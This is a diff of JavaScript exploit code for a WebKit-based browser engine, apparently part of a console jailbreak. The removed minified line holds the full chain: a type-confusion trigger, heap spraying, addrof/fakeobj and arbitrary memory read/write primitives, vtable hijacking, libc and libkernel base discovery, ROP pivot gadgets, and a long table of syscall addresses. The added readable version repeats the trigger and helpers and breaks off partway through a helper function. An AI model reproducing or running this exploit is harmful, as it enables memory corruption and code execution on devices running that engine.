@@ -1,1 +1,873 @@
-var leaker_obj={a:0},leaker_arr=new Uint32Array(6),oob_slave=new Uint8Array(1024),oob_master=new Uint32Array(7),spray=[];function spray_one(){var _=new Uint32Array(1);_[spray.length+"spray"]=123,spray.push(_)}for(var i=0;i<65536;i++)spray_one();var target={a:21100820415101592e-319,b:!1,c:!0,d:5678},target2={a:21100820415101592e-319,b:!1,c:!0,e:5678},impl_idx=0;function create_impl(){for(var _={a:target},d=0;d<32;d++)_[impl_idx+++"x"]={};return _}function trigger(_){if(impl.a!=target)for(print("wtf?");;);var d={a:1};for(var s in d){_}if(impl.a!=target){print("corrupted!"),print(typeof impl.a),print(impl.a.length),target.c=leaker_obj,leaker_obj.a=leaker_obj;var a=impl.a[4],r=impl.a[5];leaker_obj.a=oob_slave;var e=impl.a[4],l=impl.a[5];throw target.c=leaker_arr,impl.a[4]=a,impl.a[5]=r,target.c=oob_master,impl.a[4]=e,impl.a[5]=l,impl.a=target,print([a,r,e,l]),"exploit fucking finished"}}try{for(var _=0;_<1024;_++){var impl=create_impl(),s={a:impl};trigger(s)}}catch(_){print("error: "+_)}function i48_put(_,d){d[4]=0|_,d[5]=_/4294967296|0}function i48_get(_){return _[4]+4294967296*_[5]}function addrof(_){return leaker_obj.a=_,i48_get(leaker_arr)}function fakeobj(_){return i48_put(_,leaker_arr),leaker_obj.a}function read_mem_setup(_,d){i48_put(_,oob_master),oob_master[6]=d}function read_mem(_,d){read_mem_setup(_,d);for(var s=[],a=0;a<d;a++)s.push(oob_slave[a]);return s}function read_mem_s(_,d){return read_mem_setup(_,d),""+oob_slave}function read_mem_b(_,d){read_mem_setup(_,d);var s=new Uint8Array(d);return s.set(oob_slave),s}function read_mem_as_string(_,d){for(var s=read_mem_b(_,d),a="",r=0;r<s.length;r++)a+=String.fromCharCode(s[r]);return a}function write_mem(_,d){i48_put(_,oob_master),oob_master[6]=d.length;for(var s=0;s<d.length;s++)oob_slave[s]=d[s]}function read_ptr_at(_){for(var d=0,s=read_mem(_,8),a=7;a>=0;a--)d=256*d+s[a];return d}function write_ptr_at(_,d){for(var s=[],a=0;a<8;a++)s.push(255&d),d/=256;write_mem(_,s)}function hex(_){return new Number(_).toString(16)}var malloc_nogc=[];function malloc(_){var d=new Uint8Array(_);return malloc_nogc.push(d),read_ptr_at(addrof(d)+16)}var tarea=document.createElement("textarea"),real_vt_ptr=read_ptr_at(addrof(tarea)+24),fake_vt_ptr=malloc(1024);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,1024)),write_ptr_at(addrof(tarea)+24,fake_vt_ptr);var real_vtable=read_ptr_at(fake_vt_ptr),fake_vtable=malloc(8192);write_mem(fake_vtable,read_mem(real_vtable,8192)),write_ptr_at(fake_vt_ptr,fake_vtable);var fake_vt_ptr_bak=malloc(1024);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,1024));var plt_ptr=read_ptr_at(fake_vtable)-10063176;function get_got_addr(_){var d=plt_ptr+16*_,s=read_mem(d,6);if(255!=s[0]||37!=s[1])throw"invalid GOT entry";for(var a=0,r=5;r>=2;r--)a=256*a+s[r];return read_ptr_at(a+=d+6)}var webkit_base=read_ptr_at(fake_vtable),libkernel_base=get_got_addr(705)-65536,libc_base=get_got_addr(582),saveall_addr=libc_base+189128,loadall_addr=libc_base+206684,setjmp_addr=libc_base+785120,longjmp_addr=libc_base+785200,pivot_addr=libc_base+206802,infloop_addr=libc_base+280480,jop_frame_addr=libc_base+464336,get_errno_addr_addr=libkernel_base+40944,pthread_create_addr=libkernel_base+63872;function saveall(){var _=malloc(2048);read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,saveall_addr),tarea.scrollLeft=0,write_mem(_,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024));read_ptr_at(fake_vtable+472);return write_ptr_at(fake_vtable+472,saveall_addr),write_ptr_at(fake_vt_ptr+56,4660),tarea.scrollLeft=0,write_mem(_+1024,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024)),_}function pivot(_){var d=malloc(1024);read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,saveall_addr),tarea.scrollLeft=0,write_mem(d,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024));read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,pivot_addr),write_ptr_at(fake_vt_ptr+56,_),write_ptr_at(d+56,read_ptr_at(d+56)-16),write_ptr_at(_,d),tarea.scrollLeft=0,write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024))}var sys_670_addr=libkernel_base+126912,sys_192_addr=libkernel_base+126944,sys_586_addr=libkernel_base+126976,sys_545_addr=libkernel_base+127008,sys_362_addr=libkernel_base+127040,sys_363_addr=libkernel_base+127072,sys_206_addr=libkernel_base+127104,sys_5_addr=libkernel_base+127136,sys_432_addr=libkernel_base+127168,sys_136_addr=libkernel_base+127200,sys_42_addr=libkernel_base+127232,sys_188_addr=libkernel_base+127280,sys_4_addr=libkernel_base+127312,sys_546_addr=libkernel_base+127344,sys_236_addr=libkernel_base+127376,sys_127_addr=libkernel_base+127408,sys_533_addr=libkernel_base+127440,sys_429_addr=libkernel_base+127472,sys_658_addr=libkernel_base+127504,sys_345_addr=libkernel_base+127536,sys_623_addr=libkernel_base+127568,sys_329_addr=libkernel_base+127600,sys_551_addr=libkernel_base+127632,sys_593_addr=libkernel_base+127664,sys_555_addr=libkernel_base+127712,sys_673_addr=libkernel_base+127744,sys_253_addr=libkernel_base+127776,sys_272_addr=libkernel_base+127808,sys_466_addr=libkernel_base+127840,sys_539_addr=libkernel_base+127872,sys_454_addr=libkernel_base+127904,sys_33_addr=libkernel_base+127936,sys_55_addr=libkernel_base+127968,sys_53_addr=libkernel_base+128e3,sys_421_addr=libkernel_base+128036,sys_73_addr=libkernel_base+128080,sys_23_addr=libkernel_base+128112,sys_543_addr=libkernel_base+128144,sys_422_addr=libkernel_base+128176,sys_592_addr=libkernel_base+128208,sys_147_addr=libkernel_base+128240,sys_397_addr=libkernel_base+128272,sys_663_addr=libkernel_base+128304,sys_30_addr=libkernel_base+128336,sys_637_addr=libkernel_base+128368,sys_616_addr=libkernel_base+128400,sys_671_addr=libkernel_base+128432,sys_341_addr=libkernel_base+128464,sys_479_addr=libkernel_base+128496,sys_95_addr=libkernel_base+128528,sys_59_addr=libkernel_base+128573,sys_540_addr=libkernel_base+128608,sys_101_addr=libkernel_base+128640,sys_655_addr=libkernel_base+128672,sys_549_addr=libkernel_base+128704,sys_49_addr=libkernel_base+128736,sys_78_addr=libkernel_base+128768,sys_134_addr=libkernel_base+128800,sys_44_addr=libkernel_base+128832,sys_289_addr=libkernel_base+128864,sys_25_addr=libkernel_base+128896,sys_643_addr=libkernel_base+128928,sys_456_addr=libkernel_base+128960,sys_664_addr=libkernel_base+128992,sys_607_addr=libkernel_base+129024,sys_563_addr=libkernel_base+129056,sys_662_addr=libkernel_base+129088,sys_251_addr=libkernel_base+129129,sys_1_addr=libkernel_base+129162,sys_657_addr=libkernel_base+129200,sys_343_addr=libkernel_base+129232,sys_238_addr=libkernel_base+129264,sys_566_addr=libkernel_base+129296,sys_402_addr=libkernel_base+129328,sys_328_addr=libkernel_base+129360,sys_423_addr=libkernel_base+129392,sys_567_addr=libkernel_base+129424,sys_610_addr=libkernel_base+129456,sys_65_addr=libkernel_base+129488,sys_346_addr=libkernel_base+129520,sys_190_addr=libkernel_base+129552,sys_619_addr=libkernel_base+129584,sys_538_addr=libkernel_base+129616,sys_75_addr=libkernel_base+129648,sys_487_addr=libkernel_base+129680,sys_544_addr=libkernel_base+129712,sys_50_addr=libkernel_base+129744,sys_404_addr=libkernel_base+129792,sys_564_addr=libkernel_base+129824,sys_558_addr=libkernel_base+129856,sys_116_addr=libkernel_base+129888,sys_3_addr=libkernel_base+129920,sys_634_addr=libkernel_base+129952,sys_548_addr=libkernel_base+129984,sys_165_addr=libkernel_base+130016,sys_638_addr=libkernel_base+130048,sys_541_addr=libkernel_base+130080,sys_195_addr=libkernel_base+130112,sys_31_addr=libkernel_base+130144,sys_665_addr=libkernel_base+130176,sys_478_addr=libkernel_base+130208,sys_98_addr=libkernel_base+130240,sys_29_addr=libkernel_base+130272,sys_194_addr=libkernel_base+130304,sys_656_addr=libkernel_base+130336,sys_632_addr=libkernel_base+130368,sys_37_addr=(sys_454_addr=libkernel_base+130400,libkernel_base+130416),sys_599_addr=libkernel_base+130448,sys_32_addr=libkernel_base+130480,sys_554_addr=libkernel_base+130512,sys_131_addr=(sys_59_addr=libkernel_base+130544,libkernel_base+130576),sys_417_addr=libkernel_base+130608,sys_547_addr=libkernel_base+130640,sys_476_addr=libkernel_base+130672,sys_642_addr=libkernel_base+130704,sys_407_addr=libkernel_base+130736,sys_393_addr=libkernel_base+130768,sys_113_addr=libkernel_base+130800,sys_10_addr=libkernel_base+130832,sys_633_addr=libkernel_base+130864,sys_535_addr=libkernel_base+130896,sys_488_addr=libkernel_base+130928,sys_232_addr=libkernel_base+130960,sys_481_addr=libkernel_base+130992,sys_636_addr=libkernel_base+131024,sys_93_addr=libkernel_base+131056,sys_522_addr=libkernel_base+131088,sys_36_addr=libkernel_base+131120,sys_135_addr=libkernel_base+131152,sys_646_addr=libkernel_base+131184,sys_674_addr=libkernel_base+131216,sys_629_addr=libkernel_base+131248,sys_24_addr=libkernel_base+131280,sys_56_addr=libkernel_base+131312,sys_340_addr=libkernel_base+131347,sys_182_addr=libkernel_base+131488,sys_486_addr=libkernel_base+131520,sys_542_addr=libkernel_base+131552,sys_332_addr=libkernel_base+131584,sys_416_addr=libkernel_base+131616,sys_622_addr=libkernel_base+131648,sys_669_addr=libkernel_base+131680,sys_620_addr=libkernel_base+131712,sys_122_addr=libkernel_base+131744,sys_27_addr=libkernel_base+131776,sys_661_addr=libkernel_base+131808,sys_80_addr=libkernel_base+131840,sys_666_addr=libkernel_base+131872,sys_240_addr=libkernel_base+131904,sys_654_addr=libkernel_base+131936,sys_430_addr=libkernel_base+131968,sys_325_addr=libkernel_base+132e3,sys_608_addr=libkernel_base+132032,sys_290_addr=libkernel_base+132064,sys_588_addr=libkernel_base+132096,sys_532_addr=libkernel_base+132128,sys_79_addr=libkernel_base+132160,sys_552_addr=libkernel_base+132192,sys_550_addr=libkernel_base+132224,sys_649_addr=libkernel_base+132256,sys_560_addr=libkernel_base+132288,sys_628_addr=libkernel_base+132320,sys_444_addr=libkernel_base+132352,sys_74_addr=libkernel_base+132384,sys_403_addr=libkernel_base+132592,sys_400_addr=libkernel_base+132624,sys_334_addr=libkernel_base+132656,sys_86_addr=libkernel_base+132688,sys_20_addr=libkernel_base+132720,sys_102_addr=libkernel_base+132752,sys_627_addr=libkernel_base+132784,sys_581_addr=libkernel_base+132816,sys_602_addr=libkernel_base+132848,sys_534_addr=libkernel_base+132880,sys_183_addr=libkernel_base+132912,sys_640_addr=libkernel_base+132944,sys_234_addr=libkernel_base+132976,sys_83_addr=libkernel_base+133008,sys_431_addr=libkernel_base+133040,sys_600_addr=libkernel_base+133072,sys_433_addr=libkernel_base+133104,sys_90_addr=(sys_1_addr=libkernel_base+133136,libkernel_base+133168),sys_138_addr=libkernel_base+133200,sys_475_addr=libkernel_base+133232,sys_536_addr=libkernel_base+133264,sys_237_addr=libkernel_base+133296,sys_327_addr=libkernel_base+133328,sys_668_addr=libkernel_base+133360,sys_553_addr=libkernel_base+133392,sys_672_addr=libkernel_base+133424,sys_612_addr=libkernel_base+133456,sys_47_addr=libkernel_base+133488,sys_189_addr=libkernel_base+133520,sys_2_addr=libkernel_base+133552,sys_557_addr=libkernel_base+133584,sys_565_addr=libkernel_base+133616,sys_613_addr=libkernel_base+133648,sys_196_addr=libkernel_base+133680,sys_117_addr=libkernel_base+133712,sys_126_addr=libkernel_base+133744,sys_7_addr=libkernel_base+133776,sys_202_addr=libkernel_base+133808,sys_104_addr=libkernel_base+133840,sys_331_addr=libkernel_base+133872,sys_604_addr=libkernel_base+133904,sys_615_addr=libkernel_base+133936,sys_105_addr=libkernel_base+133968,sys_594_addr=libkernel_base+134e3,sys_100_addr=libkernel_base+134032,sys_677_addr=libkernel_base+134064,sys_625_addr=libkernel_base+134096,sys_596_addr=libkernel_base+134128,sys_99_addr=libkernel_base+134160,sys_401_addr=libkernel_base+134192,sys_125_addr=libkernel_base+134224,sys_15_addr=libkernel_base+134256,sys_315_addr=libkernel_base+134288,sys_441_addr=libkernel_base+134320,sys_591_addr=libkernel_base+134352,sys_618_addr=libkernel_base+134384,sys_556_addr=libkernel_base+134416,sys_121_addr=libkernel_base+134448,sys_239_addr=libkernel_base+134480,sys_137_addr=libkernel_base+134512,sys_333_addr=libkernel_base+134544,sys_595_addr=libkernel_base+134576,sys_464_addr=libkernel_base+134608,sys_324_addr=libkernel_base+134640,sys_499_addr=libkernel_base+134672,sys_583_addr=libkernel_base+134704,sys_12_addr=(sys_340_addr=libkernel_base+134736,libkernel_base+134768),sys_630_addr=libkernel_base+134800,sys_379_addr=libkernel_base+134832,sys_443_addr=libkernel_base+134864,sys_653_addr=libkernel_base+134896,sys_455_addr=libkernel_base+134928,sys_204_addr=libkernel_base+134960,sys_35_addr=libkernel_base+134992,sys_480_addr=libkernel_base+135024,sys_128_addr=libkernel_base+135056,sys_209_addr=libkernel_base+135088,sys_582_addr=libkernel_base+135120,sys_310_addr=libkernel_base+135152,sys_572_addr=libkernel_base+135184,sys_124_addr=libkernel_base+135216,sys_435_addr=libkernel_base+135248,sys_477_addr=libkernel_base+135280,sys_235_addr=libkernel_base+135312,sys_41_addr=libkernel_base+135344,sys_28_addr=libkernel_base+135376,sys_6_addr=libkernel_base+135408,sys_606_addr=libkernel_base+135440,sys_43_addr=libkernel_base+135472,sys_624_addr=libkernel_base+135504,sys_598_addr=libkernel_base+135536,sys_92_addr=libkernel_base+135568,sys_39_addr=libkernel_base+135600,sys_120_addr=libkernel_base+135632,sys_603_addr=libkernel_base+135664,sys_106_addr=libkernel_base+135696,sys_648_addr=libkernel_base+135728,sys_617_addr=libkernel_base+135760,sys_406_addr=libkernel_base+135792,sys_641_addr=libkernel_base+135824,sys_483_addr=libkernel_base+135856,sys_675_addr=libkernel_base+135888,sys_660_addr=libkernel_base+135920,sys_203_addr=libkernel_base+135952,sys_605_addr=libkernel_base+135984,sys_647_addr=libkernel_base+136016,sys_233_addr=libkernel_base+136048,sys_408_addr=libkernel_base+136080,sys_405_addr=libkernel_base+136112,sys_635_addr=libkernel_base+136144,sys_667_addr=libkernel_base+136176,sys_89_addr=libkernel_base+136208,sys_34_addr=libkernel_base+136240,sys_482_addr=libkernel_base+136272,sys_584_addr=libkernel_base+136304,sys_659_addr=libkernel_base+136336,sys_114_addr=libkernel_base+136368,sys_330_addr=libkernel_base+136400,sys_191_addr=libkernel_base+136432,sys_639_addr=libkernel_base+136464,sys_96_addr=libkernel_base+136496,sys_676_addr=libkernel_base+136528,sys_652_addr=libkernel_base+136560,sys_54_addr=libkernel_base+136592,sys_626_addr=libkernel_base+136624,sys_580_addr=libkernel_base+136656,sys_97_addr=libkernel_base+136688,sys_434_addr=libkernel_base+136720,sys_442_addr=libkernel_base+136752,sys_585_addr=libkernel_base+136784,sys_587_addr=libkernel_base+136816,sys_601_addr=libkernel_base+136848,sys_118_addr=libkernel_base+136880,sys_611_addr=libkernel_base+136912,sys_140_addr=libkernel_base+136944,sys_141_addr=libkernel_base+136976,sys_392_addr=libkernel_base+137008,sys_559_addr=libkernel_base+137040,sys_133_addr=libkernel_base+137072,aio_init_addr=sys_670_addr,fpathconf_addr=sys_192_addr,dmem_container_addr=sys_586_addr,evf_clear_addr=sys_545_addr,kqueue_addr=sys_362_addr,kevent_addr=sys_363_addr,futimes_addr=sys_206_addr,open_addr=sys_5_addr,thr_self_addr=sys_432_addr,mkdir_addr=sys_136_addr,pipe_addr=sys_42_addr,stat_addr=sys_188_addr,write_addr=sys_4_addr,evf_cancel_addr=sys_546_addr,ktimer_delete_addr=sys_236_addr,setregid_addr=sys_127_addr,jitshm_create_addr=sys_533_addr,sigwait_addr=sys_429_addr,fdatasync_addr=sys_658_addr,sigtimedwait_addr=sys_345_addr,get_gpo_addr=sys_623_addr,sched_setscheduler_addr=sys_329_addr,osem_open_addr=sys_551_addr,dynlib_get_info_addr=sys_593_addr,osem_post_addr=sys_555_addr,blockpool_move_addr=sys_673_addr,issetugid_addr=sys_253_addr,getdents_addr=sys_272_addr,rtprio_thread_addr=sys_466_addr,evf_delete_addr=sys_539_addr,_umtx_op_addr=sys_454_addr,access_addr=sys_33_addr,reboot_addr=sys_55_addr,sigaltstack_addr=sys_53_addr,getcontext_addr=sys_421_addr,munmap_addr=sys_73_addr,setuid_addr=sys_23_addr,evf_trywait_addr=sys_543_addr,setcontext_addr=sys_422_addr,dynlib_get_list_addr=sys_592_addr,setsid_addr=sys_147_addr,fstatfs_addr=sys_397_addr,aio_multi_wait_addr=sys_663_addr,accept_addr=sys_30_addr,set_phys_fmem_limit_addr=sys_637_addr,thr_get_name_addr=sys_616_addr,get_page_table_stats_addr=sys_671_addr,sigsuspend_addr=sys_341_addr,truncate_addr=sys_479_addr,fsync_addr=sys_95_addr,execve_addr=sys_59_addr,evf_open_addr=sys_540_addr,netabort_addr=sys_101_addr,blockpool_unmap_addr=sys_655_addr,osem_create_addr=sys_549_addr,getlogin_addr=sys_49_addr,mincore_addr=sys_78_addr,shutdown_addr=sys_134_addr,profil_addr=sys_44_addr,preadv_addr=sys_289_addr,geteuid_addr=sys_25_addr,set_chicken_switches_addr=sys_643_addr,sigqueue_addr=sys_456_addr,aio_multi_poll_addr=sys_664_addr,get_self_auth_info_addr=sys_607_addr,opmc_enable_addr=sys_563_addr,aio_multi_delete_addr=sys_662_addr,rfork_addr=sys_251_addr,sys_exit_addr=sys_1_addr,blockpool_batch_addr=sys_657_addr,sigpending_addr=sys_343_addr,ktimer_gettime_addr=sys_238_addr,opmc_set_ctr_addr=sys_566_addr,ksem_wait_addr=sys_402_addr,sched_getparam_addr=sys_328_addr,swapcontext_addr=sys_423_addr,opmc_get_ctr_addr=sys_567_addr,budget_get_ptype_addr=sys_610_addr,msync_addr=sys_65_addr,sigwaitinfo_addr=sys_346_addr,lstat_addr=sys_190_addr,test_debug_rwmem_addr=sys_619_addr,evf_create_addr=sys_538_addr,madvise_addr=sys_75_addr,cpuset_getaffinity_addr=sys_487_addr,evf_set_addr=sys_544_addr,setlogin_addr=sys_50_addr,ksem_init_addr=sys_404_addr,opmc_disable_addr=sys_564_addr,namedobj_delete_addr=sys_558_addr,gettimeofday_addr=sys_116_addr,read_addr=sys_3_addr,thr_get_ucontext_addr=sys_634_addr,batch_map_addr=sys_548_addr,sysarch_addr=sys_165_addr,utc_to_localtime_addr=sys_638_addr,evf_close_addr=sys_541_addr,setrlimit_addr=sys_195_addr,getpeername_addr=sys_31_addr,aio_get_data_addr=sys_665_addr,lseek_addr=sys_478_addr,connect_addr=sys_98_addr,recvfrom_addr=sys_29_addr,getrlimit_addr=sys_194_addr,dynlib_get_info_for_libdbg_addr=sys_656_addr,thr_suspend_ucontext_addr=sys_632_addr,kill_addr=(_umtx_op_addr=sys_454_addr,sys_37_addr),dynlib_process_needed_and_relocate_addr=sys_599_addr,getsockname_addr=sys_32_addr,osem_trywait_addr=sys_554_addr,flock_addr=(execve_addr=sys_59_addr,sys_131_addr),sigreturn_addr=sys_417_addr,query_memory_protection_addr=sys_547_addr,pwrite_addr=sys_476_addr,get_map_statistics_addr=sys_642_addr,ksem_getvalue_addr=sys_407_addr,sendfile_addr=sys_393_addr,socketex_addr=sys_113_addr,unlink_addr=sys_10_addr,thr_resume_ucontext_addr=sys_633_addr,dl_get_list_addr=sys_535_addr,cpuset_setaffinity_addr=sys_488_addr,clock_gettime_addr=sys_232_addr,thr_kill2_addr=sys_481_addr,set_timezone_info_addr=sys_636_addr,select_addr=sys_93_addr,pselect_addr=sys_522_addr,sync_addr=sys_36_addr,socketpair_addr=sys_135_addr,get_kernel_mem_statistics_addr=sys_646_addr,virtual_query_all_addr=sys_674_addr,physhm_open_addr=sys_629_addr,getuid_addr=sys_24_addr,revoke_addr=sys_56_addr,sigprocmask_addr=sys_340_addr,setegid_addr=sys_182_addr,cpuset_getid_addr=sys_486_addr,evf_wait_addr=sys_542_addr,sched_get_priority_max_addr=sys_332_addr,sigaction_addr=sys_416_addr,ipmimgr_call_addr=sys_622_addr,aio_submit_cmd_addr=sys_669_addr,free_stack_addr=sys_620_addr,settimeofday_addr=sys_122_addr,recvmsg_addr=sys_27_addr,aio_submit_addr=sys_661_addr,setgroups_addr=sys_80_addr,aio_multi_cancel_addr=sys_666_addr,nanosleep_addr=sys_240_addr,blockpool_map_addr=sys_654_addr,thr_create_addr=sys_430_addr,munlockall_addr=sys_325_addr,dynlib_get_info_ex_addr=sys_608_addr,pwritev_addr=sys_290_addr,mname_addr=sys_588_addr,regmgr_call_addr=sys_532_addr,getgroups_addr=sys_79_addr,osem_close_addr=sys_552_addr,osem_delete_addr=sys_550_addr,dynlib_get_obj_member_addr=sys_649_addr,debug_init_addr=sys_560_addr,mmap_dmem_addr=sys_628_addr,kldunloadf_addr=sys_444_addr,mprotect_addr=sys_74_addr,ksem_trywait_addr=sys_403_addr,ksem_close_addr=sys_400_addr,sched_rr_get_interval_addr=sys_334_addr,getitimer_addr=sys_86_addr,getpid_addr=sys_20_addr,netgetsockinfo_addr=sys_102_addr,get_cpu_usage_all_addr=sys_627_addr,eport_delete_addr=sys_581_addr,randomized_path_addr=sys_602_addr,jitshm_alias_addr=sys_534_addr,seteuid_addr=sys_183_addr,set_uevt_addr=sys_640_addr,clock_getres_addr=sys_234_addr,setitimer_addr=sys_83_addr,thr_exit_addr=sys_431_addr,sandbox_path_addr=sys_600_addr,thr_kill_addr=sys_433_addr,dup2_addr=(sys_exit_addr=sys_1_addr,sys_90_addr),utimes_addr=sys_138_addr,pread_addr=sys_475_addr,dl_get_info_addr=sys_536_addr,ktimer_settime_addr=sys_237_addr,sched_setparam_addr=sys_327_addr,aio_create_addr=sys_668_addr,osem_wait_addr=sys_553_addr,dynlib_get_list_for_libdbg_addr=sys_672_addr,get_proc_type_info_addr=sys_612_addr,getgid_addr=sys_47_addr,fstat_addr=sys_189_addr,fork_addr=sys_2_addr,namedobj_create_addr=sys_557_addr,opmc_set_ctl_addr=sys_565_addr,get_resident_count_addr=sys_613_addr,getdirentries_addr=sys_196_addr,getrusage_addr=sys_117_addr,setreuid_addr=sys_126_addr,wait4_addr=sys_7_addr,__sysctl_addr=sys_202_addr,bind_addr=sys_104_addr,sched_yield_addr=sys_331_addr,dl_get_metadata_addr=sys_604_addr,get_resident_fmem_count_addr=sys_615_addr,setsockopt_addr=sys_105_addr,dynlib_load_prx_addr=sys_594_addr,getpriority_addr=sys_100_addr,get_phys_page_size_addr=sys_677_addr,opmc_set_hw_addr=sys_625_addr,dynlib_do_copy_relocations_addr=sys_596_addr,netcontrol_addr=sys_99_addr,ksem_post_addr=sys_401_addr,netgetiflist_addr=sys_125_addr,chmod_addr=sys_15_addr,aio_suspend_addr=sys_315_addr,ksem_timedwait_addr=sys_441_addr,dynlib_dlsym_addr=sys_591_addr,get_paging_stats_of_all_objects_addr=sys_618_addr,osem_cancel_addr=sys_556_addr,writev_addr=sys_121_addr,ktimer_getoverrun_addr=sys_239_addr,rmdir_addr=sys_137_addr,sched_get_priority_min_addr=sys_333_addr,dynlib_unload_prx_addr=sys_595_addr,thr_set_name_addr=sys_464_addr,mlockall_addr=sys_324_addr,openat_addr=sys_499_addr,eport_open_addr=sys_583_addr,chdir_addr=(sigprocmask_addr=sys_340_addr,sys_12_addr),physhm_unlink_addr=sys_630_addr,mtypeprotect_addr=sys_379_addr,thr_wake_addr=sys_443_addr,blockpool_open_addr=sys_653_addr,thr_new_addr=sys_455_addr,munlock_addr=sys_204_addr,fchflags_addr=sys_35_addr,ftruncate_addr=sys_480_addr,rename_addr=sys_128_addr,poll_addr=sys_209_addr,eport_trigger_addr=sys_582_addr,getsid_addr=sys_310_addr,virtual_query_addr=sys_572_addr,fchmod_addr=sys_124_addr,_umtx_unlock_addr=sys_435_addr,mmap_addr=sys_477_addr,ktimer_create_addr=sys_235_addr,dup_addr=sys_41_addr,sendmsg_addr=sys_28_addr,close_addr=sys_6_addr,is_development_mode_addr=sys_606_addr,getegid_addr=sys_43_addr,get_vm_map_timestamp_addr=sys_624_addr,dynlib_get_proc_param_addr=sys_598_addr,fcntl_addr=sys_92_addr,getppid_addr=sys_39_addr,readv_addr=sys_120_addr,rdup_addr=sys_603_addr,listen_addr=sys_106_addr,app_state_change_addr=sys_648_addr,set_gpo_addr=sys_617_addr,ksem_unlink_addr=sys_406_addr,get_cpu_usage_proc_addr=sys_641_addr,shm_unlink_addr=sys_483_addr,reserve_2mb_page_addr=sys_675_addr,dynlib_get_info2_addr=sys_660_addr,mlock_addr=sys_203_addr,workaround8849_addr=sys_605_addr,get_sdk_compiled_version_addr=sys_647_addr,clock_settime_addr=sys_233_addr,ksem_destroy_addr=sys_408_addr,ksem_open_addr=sys_405_addr,thr_set_ucontext_addr=sys_635_addr,get_bio_usage_all_addr=sys_667_addr,getdtablesize_addr=sys_89_addr,chflags_addr=sys_34_addr,shm_open_addr=sys_482_addr,eport_close_addr=sys_584_addr,dynlib_get_list2_addr=sys_659_addr,socketclose_addr=sys_114_addr,sched_getscheduler_addr=sys_330_addr,pathconf_addr=sys_191_addr,localtime_to_utc_addr=sys_639_addr,setpriority_addr=sys_96_addr,cpumode_yield_addr=sys_676_addr,process_terminate_addr=sys_652_addr,ioctl_addr=sys_54_addr,opmc_get_hw_addr=sys_626_addr,eport_create_addr=sys_580_addr,socket_addr=sys_97_addr,_umtx_lock_addr=sys_434_addr,thr_suspend_addr=sys_442_addr,is_in_sandbox_addr=sys_585_addr,get_authinfo_addr=sys_587_addr,mdbg_service_addr=sys_601_addr,getsockopt_addr=sys_118_addr,get_paging_stats_of_all_threads_addr=sys_611_addr,adjtime_addr=sys_140_addr,kqueueex_addr=sys_141_addr,uuidgen_addr=sys_392_addr,set_vm_container_addr=sys_559_addr,sendto_addr=sys_133_addr;
+/* exploit.js */
+//for addrof&fakeobj
+var leaker_obj = {a: 0};
+var leaker_arr = new Uint32Array(6);
+
+//for arbitrary r/w
+var oob_slave = new Uint8Array(1024);
+var oob_master = new Uint32Array(7);
+
+var spray = [];
+
+function spray_one() {
+  var x = new Uint32Array(1);
+  x[spray.length + 'spray'] = 123;
+  spray.push(x);
+}
+
+//spray Uint32Arrays
+for (var i = 0; i < 0x10000; i++) {
+  spray_one();
+}
+
+
+//5678 is the length, see the original exploit for explanation of a
+var target = { a: 2.1100820415101592e-303, b: false, c: true, d: 5678 };
+//crash if this second target is not present. not used anywhere, try removing if it crashes
+var target2 = { a: 2.1100820415101592e-303, b: false, c: true, e: 5678 };
+
+var impl_idx = 0;
+
+//type-confused with WTF::StringImpl
+function create_impl() {
+  var ans = { a: target }; //a is type-confused with m_hashAndFlags
+  for (var i = 0; i < 32; i++)
+    ans[(impl_idx++) + 'x'] = {};
+  return ans;
+}
+
+function trigger(x) {
+  if (impl.a != target) {
+    print("wtf?");
+    while (1);
+  }
+  var o = { a: 1 }; //a is type-confused with m_impl
+  for (var i in o) {
+    {
+      i = x;
+      function i() { }
+    }
+    o[i]; //this sets bit 4 (|= 16) in m_hashAndFlags
+  }
+  if (impl.a != target) {
+    print("corrupted!");
+    print(typeof (impl.a)); //object
+    print(impl.a.length); //5678
+    target.c = leaker_obj;
+    leaker_obj.a = leaker_obj;
+    var l1 = impl.a[4];
+    var l2 = impl.a[5];
+    leaker_obj.a = oob_slave;
+    var s1 = impl.a[4];
+    var s2 = impl.a[5];
+    target.c = leaker_arr;
+    impl.a[4] = l1;
+    impl.a[5] = l2;
+    target.c = oob_master;
+    impl.a[4] = s1;
+    impl.a[5] = s2;
+    impl.a = target;
+    print([l1, l2, s1, s2]);
+    throw "exploit fucking finished";
+  }
+}
+
+try {
+  for (var _ = 0; _ < 1024; _++) {
+    var impl = create_impl(); //JSString::toIdentifier checks some bits in the type-confused structure ID, so iterate over those
+    var s = { a: impl };
+    trigger(s);
+  }
+}
+catch (e) {
+  print("error: " + e);
+}
+/* helper.js */
+function i48_put(x, a) {
+  a[4] = x | 0;
+  a[5] = (x / 4294967296) | 0;
+}
+
+function i48_get(a) {
+  return a[4] + a[5] * 4294967296;
+}
+
+function addrof(x) {
+  leaker_obj.a = x;
+  return i48_get(leaker_arr);
+}
+
+function fakeobj(x) {
+  i48_put(x, leaker_arr);
+  return leaker_obj.a;
+}
+
+function read_mem_setup(p, sz) {
+  i48_put(p, oob_master);
+  oob_master[6] = sz;
+}
+
+function read_mem(p, sz) {
+  read_mem_setup(p, sz);
+  var arr = [];
+  for (var i = 0; i < sz; i++)
+    arr.push(oob_slave[i]);
+  return arr;
+}
+
+function read_mem_s(p, sz) {
+  read_mem_setup(p, sz);
+  return "" + oob_slave;
+}
+
+function read_mem_b(p, sz) {
+  read_mem_setup(p, sz);
+  var b = new Uint8Array(sz);
+  b.set(oob_slave);
+  return b;
+}
+
+function read_mem_as_string(p, sz) {
+  var x = read_mem_b(p, sz);
+  var ans = '';
+  for (var i = 0; i < x.length; i++)
+    ans += String.fromCharCode(x[i]);
+  return ans;
+}
+
+function write_mem(p, data) {
+  i48_put(p, oob_master);
+  oob_master[6] = data.length;
+  for (var i = 0; i < data.length; i++)
+    oob_slave[i] = data[i];
+}
+
+function read_ptr_at(p) {
+  var ans = 0;
+  var d = read_mem(p, 8);
